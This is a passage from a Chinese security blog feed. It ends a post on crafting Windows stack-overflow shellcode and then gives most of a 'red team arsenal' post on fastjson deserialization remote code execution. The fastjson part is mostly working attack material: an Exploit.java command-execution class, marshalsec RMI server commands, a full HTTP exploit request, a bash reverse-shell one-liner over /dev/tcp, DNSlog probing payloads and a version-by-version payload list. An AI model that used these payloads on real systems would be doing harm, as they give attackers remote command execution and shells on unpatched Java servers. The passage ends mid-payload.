class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE LibHandle;</span><br><span class="line">MYPROC ProcAdd;</span><br><span class="line">LibHandle = LoadLibrary(<span class="string">"user32"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"user32=0x%x\n"</span>,LibHandle);</span><br><span class="line"></span><br><span class="line">ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"messagesbox=0x%x\n"</span>,ProcAdd);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzIzMTQucG5n?x-oss-process=image/format,png" alt="image-20200628232314406"></p><h3 id="同理找到-ExitProcess"><a href="#同理找到-ExitProcess" class="headerlink" title="同理找到 ExitProcess"></a>同理找到 ExitProcess</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzM1MzIucG5n?x-oss-process=image/format,png" alt="image-20200628233532091"></p><h3 id="获取到的全部-api的函数地址："><a href="#获取到的全部-api的函数地址：" class="headerlink" title="获取到的全部 api的函数地址："></a>获取到的全部 api的函数地址：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp esp &#x3D; 0x77e35b79</span><br><span class="line">user32&#x3D;0x77d10000</span><br><span class="line">messasbox&#x3D;0x77d507ea</span><br><span class="line">ExitProcess&#x3D;0x7c81cb12</span><br></pre></td></tr></table></figure><h3 id="编写汇编代码"><a href="#编写汇编代码" class="headerlink" title="编写汇编代码"></a>编写汇编代码</h3><p>使用C语言的 _ASM{} 可以直接编写汇编的代码</p><p>下面是弹窗的汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt; </span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">_asm&#123; </span><br><span class="line">sub sp,0x440</span><br><span class="line">xor ebx,ebx</span><br><span class="line">push ebx &#x2F;&#x2F; cut string</span><br><span class="line">push 0x6F657A20  &#x2F;&#x2F;zeo的ascll码</span><br><span class="line">push 0x6D612069</span><br><span class="line">mov eax,esp &#x2F;&#x2F;load address of failwest</span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x77D507EA &#x2F;&#x2F; 系统获取的messageboxa的地址</span><br><span class="line">call eax &#x2F;&#x2F;call MessageboxA</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x7C81CB12     &#x2F;&#x2F;系统获取的exitprocess的地址</span><br><span class="line">call eax &#x2F;&#x2F;call exit(0)</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用vc6的反汇编功能，找出代码的机器码</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU4MjgucG5n?x-oss-process=image/format,png" alt="image-20200630175828608"></p><p>转化后的机器码和解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">33 DB                xor         ebx,ebx                    </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">68 20 7A 65 6F       push        6F657A20h                  </span><br><span class="line">68 69 20 61 6D       push        6D612069h                  </span><br><span class="line">8B C4                mov         eax,esp                    </span><br><span class="line">53                   push        ebx              MessageBoxA函数额 4 个参数按照从右向左的顺序入            </span><br><span class="line">50                   push        eax                        </span><br><span class="line">50                   push        eax                        </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">B8 EA 07 D5 77       mov         eax,77D507EAh    调用 MessageBoxA，不同的机器这里的函数入口地址可能不同，按实际值填入         </span><br><span class="line">FF D0                call        eax                        </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">B8 12 CB 81 7C       mov         eax,7C81CB12h    调用 exit(0)。           </span><br><span class="line">FF D0                call        eax</span><br></pre></td></tr></table></figure><h3 id="写入文件完整的payload"><a href="#写入文件完整的payload" class="headerlink" title="写入文件完整的payload"></a>写入文件完整的payload</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODE5MDEucG5n?x-oss-process=image/format,png" alt="image-20200630181901702"></p><h3 id="运行一下，成功！"><a href="#运行一下，成功！" class="headerlink" title="运行一下，成功！"></a>运行一下，成功！</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMzMzQucG5n?x-oss-process=image/format,png" alt="image-20200630183334713"></p><h2 id="0x05-shellcode踩坑"><a href="#0x05-shellcode踩坑" class="headerlink" title="0x05 shellcode踩坑"></a>0x05 shellcode踩坑</h2><p>1、全部地址淹没后，就要把esp淹没，esp可以随便写</p><p>2、本次使用的是 jmp esp = 0x77e35b79 ，找到后但是编写shellcode的时候，因为是小端序</p><p>​ 所以填写的时候是反向的</p><p>​ 所以填写的时候是反向的</p><p>​ 所以填写的时候是反向的</p><p>本来是 0x77e35b79 ，那么写入的时候就是 79 5b e3 77 例如</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODIyMzQucG5n?x-oss-process=image/format,png" alt="image-20200630182234282"></p><p>3、虽然说是jmp esp指令需要注意 小端序，但是后面转化过的shellcode 就不需要了，因为已经转化过了，不用多此一举，已转化过了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMyMDcucG5n?x-oss-process=image/format,png" alt="image-20200630183207368"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红队武器库:fastjson小于1.2.68全漏洞RCE利用exp</title>
      <link href="/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/"/>
      <url>/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01漏洞介绍"><a href="#0x01漏洞介绍" class="headerlink" title="0x01漏洞介绍"></a>0x01漏洞介绍</h1><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><h1 id="0x02影响范围"><a href="#0x02影响范围" class="headerlink" title="0x02影响范围"></a>0x02影响范围</h1><p>Fastjson &lt; 1.2.68</p><p>Fastjson爆出的绕过方法可以通杀1.2.68版本以下所有</p><h1 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h1><p>下面以Fastjson 1.2.47 为例子，因为vulhub有现成的环境十分方便</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P牛我用vulhub中的 1.2.47的docker   想测试doslog检查 fastjson 但是总是收到不到dnslog  但是正常的exp反弹shell就是可以我很疑惑    </span><br><span class="line">我的用法正确吗，用的这个&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;bouaiq.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="下面是流程示意图"><a href="#下面是流程示意图" class="headerlink" title="下面是流程示意图"></a>下面是流程示意图</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxMTE3NDUucG5n?x-oss-process=image/format,png" alt="image-20200704111745527"></p><p>主机A：存在fastjson反序列化漏洞的主机<br>主机C：为RMI/LDAP服务<br>主机B：为构造的恶意类（包含要执行的命令）</p><h3 id="在整个远程命令执行流程"><a href="#在整个远程命令执行流程" class="headerlink" title="在整个远程命令执行流程"></a>在整个远程命令执行流程</h3><p>1、黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</p><p>2、主机A引发反序列化漏洞，发送了进行rmi远程发放调用，去连接主机C</p><p>3、主机C的rmi服务指定加载主机B的恶意java类，所以主机A通过主机C的rmi服务最终加载并执行主机B的恶意java类</p><p>4、主机A引发恶意系统命令执行</p><h1 id="0x04复现流程"><a href="#0x04复现流程" class="headerlink" title="0x04复现流程"></a>0x04复现流程</h1><p>根据上图流程和环境复现：</p><p>主机A： <a href="http://1.1.1.1:8090/" target="_blank" rel="noopener">http://1.1.1.1:8090</a> (存在Fastjson漏洞主机)<br>主机B： <a href="http://2.2.2.2:8888/" target="_blank" rel="noopener">http://2.2.2.2:8888</a> (恶意java类服务)<br>主机C： rmi://2.2.2.2:9999 (远程方法调用服务)</p><p>实际上主机B和C是一台机器不同端口）</p><h2 id="0x041-构造恶意方法"><a href="#0x041-构造恶意方法" class="headerlink" title="0x041 构造恶意方法"></a>0x041 构造恶意方法</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p><p>首先编译并上传命令执行代码</p><p>使用如下payload：</p><p>其中touch /zydx666为系统命令，可以根据自己需求随意修改</p><p>注意该文件名叫Exploit.java固定格式不能变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Exploit() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"touch /zydx666"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> void main(String[] args) throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在主机B中使用javac命令编译Exploit.java文件，生成一个Exploit.class文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure><p>然后在主机B启一个http服务，中间件随意，但是需要能访问到Exploit.class文件，这里使用python3临时启动一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server --bind <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure><h2 id="0x042-开启远程方法调用rmi服务"><a href="#0x042-开启远程方法调用rmi服务" class="headerlink" title="0x042 开启远程方法调用rmi服务"></a>0x042 开启远程方法调用rmi服务</h2><p>接下来在<strong>主机C</strong>开启rmi服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.1.1.1:8888/#Exploit" 9999</span><br></pre></td></tr></table></figure><p>marshalsec-0.0.3-SNAPSHOT-all.jar</p><p> 参考 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p><p>至此服务已经全部就绪</p><h2 id="0x043-发送payload"><a href="#0x043-发送payload" class="headerlink" title="0x043 发送payload"></a>0x043 发送payload</h2><p>接下来向<strong>主机A</strong>（存在漏洞机子）发送fastjson反序列化漏洞payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    "a":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"java.lang.Class",</span></span><br><span class="line"><span class="comment">        "val":"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    "b":&#123;</span></span><br><span class="line"><span class="comment">        "<span class="doctag">@type</span>":"com.sun.rowset.JdbcRowSetImpl",</span></span><br><span class="line"><span class="comment">        "dataSourceName":"rmi://2.2.2.2:9999/Exploit",</span></span><br><span class="line"><span class="comment">        "autoCommit":true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>此时主机A收到POST请求，触发反序列化漏洞，最终执行Exploit.class 文件中的内容</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NDgucG5n?x-oss-process=image/format,png" alt="image-20200703234748062"></p><p>我使用的是反弹shell命令</p><p>反弹shell成功：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQxMTUucG5n?x-oss-process=image/format,png" alt="image-20200703234115010"></p><h1 id="0x05简化版攻击工具"><a href="#0x05简化版攻击工具" class="headerlink" title="0x05简化版攻击工具"></a>0x05简化版攻击工具</h1><p>下面提供一个简化版工具的工具</p><p>是使用<a href="https://github.com/wyzxxz/fastjson_rce_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包" target="_blank" rel="noopener">https://github.com/wyzxxz/fastjson_rce_tool这位师傅写的，一键起服务和生成恶意代码整个rmi+class文件的jar包</a></p><p>第一步：只需要在自己的服务器上启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 1.1.1.1 8888 &quot;bash&#x3D;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;80 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>第二步：发送payload</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ3NTQucG5n?x-oss-process=image/format,png" alt=""></p><p>成功反弹shell</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDMyMzQ5MTQucG5n?x-oss-process=image/format,png" alt="image-20200703234914580"></p><h1 id="0x06-漏洞检测"><a href="#0x06-漏洞检测" class="headerlink" title="0x06 漏洞检测"></a>0x06 漏洞检测</h1><h2 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h2><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p><p>例如</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI2MTcucG5n?x-oss-process=image/format,png" alt="image-20200704162617071"></p><h2 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h2><p>我使用以下payload测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI4NDQucG5n?x-oss-process=image/format,png" alt="image-20200704162844047"></p><p>最终收到dnslog</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjI5MjIucG5n?x-oss-process=image/format,png" alt="image-20200704162922529"></p><h2 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>畸形的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA3MDQxNjMxNTAucG5n?x-oss-process=image/format,png" alt=""></p><p>POC:</p><p>要嵌套在里面zeo里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure><h1 id="0x07-多版本payload集合"><a href="#0x07-多版本payload集合" class="headerlink" title="0x07 多版本payload集合"></a>0x07 多版本payload集合</h1><p>影响版本：  </p><h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1099&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;x.x.x.x:1098&#x2F;jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1399&#x2F;Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>影响版本：  </p><h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    